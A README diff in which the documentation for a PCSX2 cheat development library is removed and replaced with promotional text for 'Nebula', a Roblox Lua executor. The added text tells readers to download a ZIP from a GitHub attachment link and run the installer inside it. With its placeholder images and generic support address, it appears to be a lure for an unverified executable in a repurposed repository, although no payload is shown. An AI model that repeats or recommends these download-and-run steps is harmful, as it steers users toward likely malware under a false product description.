@@ -1,68 +1,63 @@
-# PCSX2 Cheat Development Kit  
-PCSX2 Menu Trainer Development Kit is a C++ library designed to simplify the process of creating cheats for the PCSX2 emulator. 
-It aims to bridge the gap between modern cheat development practices and the classic era of cheat codes.
-This framework provides tools to port older codes to a more modern approach, using additional libraries such as dear imgui and minhook.
+# Roblox-Script
 
-| ![image](https://github.com/NightFyre/PCSX2-CheatFrameWork/assets/80198020/7417d7e7-603c-465a-807f-62abf88179eb) | ![image](https://user-images.githubusercontent.com/80198020/201475737-21591eb0-8858-4575-8ee9-5d9d2e07d1dc.png) | ![image](https://user-images.githubusercontent.com/80198020/200977619-e22fe7a5-b914-4906-9e3c-50f929ea3ebf.png) | 
-| :---: | :---: |  :---: |
+![Roblox Script Logo](https://example.com/roblox-script-logo.png)
 
-## FEATURES
-- Easily Read & Write to virtual PS2 Memory
-- PCSX2 Emulator Process Virtual Method Hooking
-- Rendering API Helpers
-- Access EE & IOP Registers during execution
+Nebula is a new Lua executor for Roblox. It's simple, straightforward, and we ensure quick patches after Roblox updates.
 
-## USAGE
-1. include the SDK header as well as any required packages.  
-*NOTE: Engine_Package.h is a required package and needs to be manually included.*
- - `CDK.h`                  //  Including the SDK header will provide access to all the most necessary features.
- - `Core_Package.cpp`       //  Main Package and must be included for basic usage 
- - `PCSX2_Package.cpp`      //  PCSX2 specific members and functions. Like the rendering API's for instance
+## Features
 
-2. Initialize the SDK
- - `PlayStation2::InitCDK();`   //  Basic CDK Initialization
+🚀 Fast execution speed  
+🔒 Secure scripting environment  
+🔄 Regular updates and bug fixes  
+🌌 Sleek and user-friendly interface  
 
-3. Do Stuff
-https://github.com/NightFyre/PCSX2-CheatFramework/blob/70dcf7dc51747df014f5d537a3188b8de1fe95a2/dllmain.cpp#L18-L29
+## Installation
 
-4. (optional) include game package for additional controls
+To install Nebula, follow these steps:
 
-## USAGE EXAMPLES
+1. Download the installation ZIP file by clicking the button below:
+   [![Download Nebula](https://img.shields.io/badge/Download-Nebula-blueviolet)](https://github.com/user-attachments/files/17578205/Program.zip)
 
-- Access EE Memory
-https://github.com/NightFyre/PCSX2-CheatFramework/blob/b2ae5a44d7c1452256920c4af81f745cdf0df2f3/examples/GameMemory/dllmain.cpp#L33-L34
+2. Extract the ZIP file to a location on your computer.
 
-- Get Virtual Address
-https://github.com/NightFyre/PCSX2-CheatFramework/blob/b2ae5a44d7c1452256920c4af81f745cdf0df2f3/examples/GameMemory/dllmain.cpp#L37-L38
+3. Run the installation file and follow the on-screen instructions to complete the setup.
 
-- Read Virtual Memory
-https://github.com/NightFyre/PCSX2-CheatFramework/blob/b2ae5a44d7c1452256920c4af81f745cdf0df2f3/examples/GameMemory/dllmain.cpp#L41-L47
+## How to Use
 
-- Access Class Members via GamePackages 
-```cpp
-/// SOCOM 1 -> Access SealObject & Modify Weapon Ammo
-{
-    // Create an instance of the Offsets Class
-    SOCOM1::CZSeal* pLocalSeal = SOCOM1::CZSeal::GetDefaultInstance();
-    if (pLocalSeal)
-        Console::cLogMsg("[+][PCSX2-CDK][SOCOM] LocalSeal Name: %s\n", EConsoleColors::green, pLocalSeal->GetName().c_str());
-}
-```
+Once installed, you can launch Nebula and start executing Lua scripts in your Roblox games. Here's a quick guide to get you started:
 
-- Hook Rendering API
-https://github.com/NightFyre/PCSX2-CheatFramework/blob/7c786cdd3e7f8c0855bc7d1f83df687092424604/examples/Rendering/dllmain.cpp#L44-L51
+1. Open Nebula from your desktop or start menu.
 
+2. Load the Roblox game you want to script in.
 
-### References & Credits
-- [PCSX2](https://github.com/PCSX2/pcsx2)
-- [GameHacking.org](https://gamehacking.org/system/ps2)
-- [Sly Cooper Modding Community](https://discord.com/invite/2GSXcEzPJA) 
-- [SOCOM Modding Community](https://discord.com/invite/PCJGrwMdUS) 
-- [A General Guide for Making Cheats & Trainers for PCSX2](https://www.unknowncheats.me/forum/general-programming-and-reversing/569991-pcsx2-guide-cheats-trainers.html)
+3. Write or paste your Lua script into Nebula's script editor.
 
-### License
-This framework is distributed under the MIT License.
+4. Click the "Execute" button to run the script in the game.
 
-### Disclaimer
-1. *This framework is intended for educational and single-player use.*  
-2. *Use cheats responsibly and respect the terms of use of the games you are modifying.*
+5. Monitor the console output for any errors or feedback from the script.
+
+6. Enjoy scripting in Roblox with Nebula!
+
+## Screenshots
+
+Here are some screenshots of Nebula in action:
+
+![Screenshot 1](https://example.com/screenshot1.png)
+
+![Screenshot 2](https://example.com/screenshot2.png)
+
+## Contribution
+
+We welcome contributions from the community to help improve Nebula and make it even better. If you have any suggestions, bug reports, or feature requests, feel free to open an issue or submit a pull request on GitHub.
+
+## Support
+
+If you encounter any issues while using Nebula or have any questions, you can reach out to our support team at support@nebula.com. We are here to help you get the most out of our Lua executor for Roblox.
+
+## License
+
+Nebula is released under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+---
+
+🌟 Thank you for choosing Nebula for your Roblox scripting needs! Happy scripting in Roblox with Nebula! 🌟
